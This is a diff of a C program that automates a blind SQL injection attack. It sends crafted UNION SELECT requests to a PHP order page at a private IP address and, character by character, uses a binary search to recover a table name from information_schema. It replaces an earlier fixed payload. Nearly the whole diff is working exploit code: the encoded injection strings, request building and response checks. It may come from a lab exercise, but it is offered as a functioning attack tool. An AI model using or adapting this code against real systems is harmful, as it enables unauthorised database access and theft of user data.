@@ -1,6 +1,4 @@
 #define __MY_DEBUG__
-#define PAYLOAD "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%27a%25%27%20LIMIT%201%3b"
-
 #include <limits.h>
 #include <string.h>
 #include <stdint.h>
@@ -161,15 +159,87 @@ void _send(const int32_t client, const void * const data, size_t size) {
     }
 }
 
+bool recv_empty(int32_t sockfd) {
+    enum {
+        CHUNK = 16
+    };
+    char * buf = malloc(CHUNK);
+    size_t size = 0;
+    *buf = 0;
+    char *header_end=0;
+    size_t recvd;
 
-void empty_recv(const int sockfd) {
-    char buf[1024];
-    memset(buf, 0, sizeof(buf));
+    while (1) {
+        recvd = _recv(sockfd, buf + size, CHUNK - 1);
+        if (!recvd) {
+            break;
+        }
 
-    _recv(sockfd, buf, sizeof(buf));
-#ifdef __MY_DEBUG__
-    puts(buf);
-#endif
+        size += recvd;
+        buf = realloc(buf, size+CHUNK);
+        buf[size] = 0;
+
+        header_end = strstr(buf, "\r\n\r\n");
+
+        if (header_end) {
+            break;
+        }
+    }
+    char Content_Length[] = "Content-Length: ";
+    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
+    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
+    size_t body_left = content_len - body_recvd;
+    buf = realloc(buf, body_left+size+1);
+    recvd = _recv(sockfd, buf + size, body_left);
+    size = size + recvd;
+
+    const char *ptr = strstr(buf, "Your order has been sent!");
+
+    #ifdef __MY_DEBUG__
+        puts(buf);
+    #endif
+
+    free(buf);
+
+    return ptr;
+}
+
+#define PAYLOAD_BEGIN "order_id=0%20UNION%20SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_name%20LIKE%20%27%25usr%25%27%20AND%20table_name%20LIKE%20%25"
+#define PAYLOAD_END "%25%27%20LIMIT%201%3b"
+
+
+
+bool send_check_success(char * discovered_name, int sockfd) {
+    char mal_req[2048];
+    sprintf(mal_req, "GET /index.php?%s%s%s HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Connection: Keep-Alive\r\n"
+        "\r\n",
+        PAYLOAD_BEGIN, discovered_name, PAYLOAD_END
+    );
+    _send(sockfd, mal_req, strlen(mal_req));
+
+    return recv_empty(sockfd);
+}
+
+
+void binary_search(char * discovered_name, int sockfd) {
+    for (int i = 0; i < 10; i++) {
+        char low = 0x20;
+        char high = 0x5f;
+        while (low <= high) {
+            char mid = low + (high - low) / 2;
+            discovered_name[i] = mid;
+
+            if (send_check_success(discovered_name, sockfd)) {
+                low=mid+1;
+            }
+            else {
+                high=mid-1;
+            }
+        }
+    }
 }
 
 int32_t main() {
@@ -177,20 +247,15 @@ int32_t main() {
 
     _connect(sockfd, WEB_ADDR, 80);
 
-    const char payload[] = PAYLOAD;
-
     char mal_req[1024];
 
-    sprintf(mal_req, "GET /index.php?%s HTTP/1.1\r\n"
-        "Host: 192.168.1.202\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Connection: Keep-Alive\r\n"
-        "\r\n",
-        payload);
+    char table_name[11] = {0};
 
-    _send(sockfd, mal_req, strlen(mal_req));
+    binary_search(table_name, sockfd);
 
-    empty_recv(sockfd);
+#ifdef __MY_DEBUG__
+    puts(table_name);
+#endif
 
     close(sockfd);
 }
